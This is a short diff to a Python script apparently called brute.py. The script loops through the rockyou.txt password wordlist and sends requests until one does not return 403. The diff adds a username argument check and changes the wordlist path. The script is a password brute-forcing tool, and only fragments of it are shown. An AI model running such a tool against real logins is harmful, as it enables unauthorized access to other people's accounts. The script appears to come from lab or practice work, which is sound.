@@ -2,7 +2,11 @@ import requests
 import os, sys
 import json
 
-f = open("/usr/share/wordlists/rockyou.txt")
+
+if len(sys.argv) <2:
+	print "Too few arguments! Usage: python brute.py <username>"
+
+f = open("/root/Downloads/rockyou.txt")
 wordlist = f.readlines()
 size = len(wordlist)
 i = 0
@@ -15,4 +19,3 @@ for word in wordlist:
 	
 	if resp.status_code != 403:
 		break
-
